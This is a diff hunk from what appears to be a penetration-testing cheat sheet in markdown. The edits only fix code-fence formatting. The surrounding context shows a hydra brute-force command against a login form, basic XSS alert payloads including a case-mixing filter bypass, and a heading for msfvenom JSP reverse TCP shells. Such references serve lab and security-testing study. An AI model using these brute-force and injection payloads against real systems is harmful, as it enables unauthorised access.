@@ -93,16 +93,16 @@ hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^
 
 
 ## XSS
-```
+```sh
 \<script\>alert(1)\</script\>\
 \<ScRiPt\>alert(1)\</ScRiPt\>
-
+```
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 
 ## XSS via GET & POST Request
 
-![alt text](https://raw.githubusercontent.com/SattamInfosec/SattamInfosec/main/XSS%20Via%20GET%20%26%20POST.PNG)\
+![alt text](https://raw.githubusercontent.com/SattamInfosec/SattamInfosec/main/XSS%20Via%20GET%20%26%20POST.PNG)
 
 ## msfvenom shells
 **JSP Java Meterpreter Reverse TCP**\
